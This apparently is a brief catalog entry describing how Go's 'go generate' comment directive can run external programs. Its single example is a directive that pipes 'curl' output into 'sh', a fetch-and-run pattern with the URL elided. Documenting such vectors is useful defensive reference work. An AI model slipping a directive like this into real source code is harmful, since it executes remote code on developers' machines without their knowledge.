---
title: go generate
tags:
- cli
- input-file
- eval-sh
references:
- https://go.dev/blog/generate
---

Since Go 1.4, the `go generate` command can be used to annotate Go source code with comments that invokes external programs to generate Go code.

```go
//go:generate sh -c "curl ... | sh"
```
